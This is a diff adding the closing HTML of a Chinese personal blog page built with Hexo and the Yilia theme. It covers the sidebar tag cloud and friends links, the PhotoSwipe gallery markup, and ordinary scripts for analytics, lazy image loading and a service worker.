+      		<a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/litten/hexo-theme-yilia" target="_blank">Yilia</a> by Litten
+      	</div>
+    </div>
+  </div>
+</footer>
+    </div>
+    <script>
+	var yiliaConfig = {
+		mathjax: false,
+		isHome: false,
+		isPost: true,
+		isArchive: false,
+		isTag: false,
+		isCategory: false,
+		open_in_new: false,
+		toc_hide_index: true,
+		root: "/",
+		innerArchive: true,
+		showTags: false
+	}
+</script>
+
+<script src="/js/page.js"></script><script src="/main.0cf68a.js"></script><script>!function(){!function(e){var t=document.createElement("script");document.getElementsByTagName("body")[0].appendChild(t),t.setAttribute("src",e)}("/slider.e37972.js")}()</script>
+
+
+    
+<div class="tools-col" q-class="show:isShow,hide:isShow|isFalse" q-on="click:stop(e)">
+  <div class="tools-nav header-menu">
+    
+    
+      
+      
+      
+    
+      
+      
+      
+    
+      
+    
+    
+
+    <ul style="width: 70%">
+    
+    
+      
+      <li style="width: 50%" q-on="click: openSlider(e, 'innerArchive')"><a href="javascript:void(0)" q-class="active:innerArchive">所有文章</a></li>
+      
+        
+      
+      <li style="width: 50%" q-on="click: openSlider(e, 'friends')"><a href="javascript:void(0)" q-class="active:friends">友链</a></li>
+      
+        
+      
+        
+    </ul>
+  </div>
+  <div class="tools-wrap">
+    
+    	<section class="tools-section tools-section-all" q-show="innerArchive">
+        <div class="search-wrap">
+          <input class="search-ipt" q-model="search" type="text" placeholder="find something…">
+          <i class="icon-search icon" q-show="search|isEmptyStr"></i>
+          <i class="icon-close icon" q-show="search|isNotEmptyStr" q-on="click:clearChose(e)"></i>
+        </div>
+        <div class="widget tagcloud search-tag">
+          <p class="search-tag-wording">tag:</p>
+          <label class="search-switch">
+            <input type="checkbox" q-on="click:toggleTag(e)" q-attr="checked:showTags">
+          </label>
+          <ul class="article-tag-list" q-show="showTags">
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">软件分享</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">Android</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">game</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">Hexo</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color1">JavaScript</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">Java</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">mtk</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">MIUI</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color1">旧机博物馆</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">git</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color2">Termux</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">原神</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">Win</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">Html</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color2">安卓学习笔记</a>
+              </li>
+            
+            <div class="clearfix"></div>
+          </ul>
+        </div>
+        <ul class="search-ul">
+          <p q-show="jsonFail" style="padding: 20px; font-size: 12px;">
+            缺失模块
+          </p>
+          <li class="search-li" q-repeat="items" q-show="isShow">
+            <a q-attr="href:path|urlformat" class="search-title"><i class="icon-quo-left icon"></i><span q-text="title"></span></a>
+            <p class="search-time">
+              <i class="icon-calendar icon"></i>
+              <span q-text="date|dateformat"></span>
+            </p>
+            <p class="search-tag">
+              <i class="icon-price-tags icon"></i>
+              <span q-repeat="tags" q-on="click:choseTag(e, name)" q-text="name|tagformat"></span>
+            </p>
+          </li>
+        </ul>
+    	</section>
+    
+
+    
+    	<section class="tools-section tools-section-friends" q-show="friends">
+  		
+        <ul class="search-ul">
+          
+            <li class="search-li">
+              <a href="https://www.yzjlb.net/" target="_blank" class="search-title"><i class="icon-quo-left icon"></i>影子俱乐部</a>
+            </li>
+          
+            <li class="search-li">
+              <a href="https://luotianyi.vc/" target="_blank" class="search-title"><i class="icon-quo-left icon"></i>Luminous&#39; Home</a>
+            </li>
+          
+            <li class="search-li">
+              <a href="http://i.yzjlb.net/" target="_blank" class="search-title"><i class="icon-quo-left icon"></i>影子博客</a>
+            </li>
+          
+            <li class="search-li">
+              <a href="https://www.himiku.com/" target="_blank" class="search-title"><i class="icon-quo-left icon"></i>初之音</a>
+            </li>
+          
+            <li class="search-li">
+              <a href="https://zhaoq.me" target="_blank" class="search-title"><i class="icon-quo-left icon"></i>ZhaoQuinn &#39;s Blog</a>
+            </li>
+          
+        </ul>
+  		
+    	</section>
+    
+
+    
+  </div>
+  
+</div>
+    <!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                <!--  Controls are self-explanatory. Order can be changed. -->
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" style="display:none" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div>
+  </div>
+
+<script type="text/javascript" src="/js/clicklove.js"></script>
+
+
+
+
+<script type="text/javascript" src="https://lib.baomitu.com/clipboard.js/2.0.4/clipboard.js"></script>
+<script type="text/javascript" src="https://apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js"></script>
+<script type="text/javascript" src="/js/clipboard_use.js"></script>
+
+<!--在QQ内隐藏评论 有输入框腾讯会拦截-->
+<script>
+window.addEventListener('load',function(){
+if(navigator.userAgent.match(/QQ\//i)) {
+document.getElementById("mobile-menu").style.display = "none";
+document.getElementById("comments").style.display = "none";
+}})
+</script>
+
+<!-- Cloudflare Web Analytics --><script defer src='https://static.cloudflareinsights.com/beacon.min.js' data-cf-beacon='{"token": "78371dfddfb940b48346a7dba9af9000"}'></script><!-- End Cloudflare Web Analytics -->
+
+
+<script src="/live2d/auto_waifu.js"></script>
+
+<script>if ('serviceWorker' in navigator) {
+  navigator.serviceWorker.register('/sw.js?t=1771534389384')
+    .then(function () {console.log('ServiceWorker Register Successfully.')})
+    .catch(function (e) {console.error(e)});
+}
+</script><script>
+            window.imageLazyLoadSetting = {
+                isSPA: false,
+                preloadRatio: 1,
+                processImages: null,
+            };
+        </script><script>window.addEventListener("load",function(){var t=/\.(gif|jpg|jpeg|tiff|png)$/i,r=/^data:image\/[a-z]+;base64,/;Array.prototype.slice.call(document.querySelectorAll("img[data-original]")).forEach(function(a){var e=a.parentNode;"A"===e.tagName&&(e.href.match(t)||e.href.match(r))&&(e.href=a.dataset.original)})});</script><script>!function(n){n.imageLazyLoadSetting.processImages=o;var e=n.imageLazyLoadSetting.isSPA,i=n.imageLazyLoadSetting.preloadRatio||1,r=Array.prototype.slice.call(document.querySelectorAll("img[data-original]"));function o(){e&&(r=Array.prototype.slice.call(document.querySelectorAll("img[data-original]")));for(var t,a=0;a<r.length;a++)0<=(t=(t=r[a]).getBoundingClientRect()).bottom&&0<=t.left&&t.top<=(n.innerHeight*i||document.documentElement.clientHeight*i)&&function(){var t,e,n,i,o=r[a];t=o,e=function(){r=r.filter(function(t){return o!==t})},n=new Image,i=t.getAttribute("data-original"),n.onload=function(){t.src=i,e&&e()},t.src!==i&&(n.src=i)}()}o(),n.addEventListener("scroll",function(){var t,e;t=o,e=n,clearTimeout(t.tId),t.tId=setTimeout(function(){t.call(e)},500)})}(this);</script></body>
+</html>
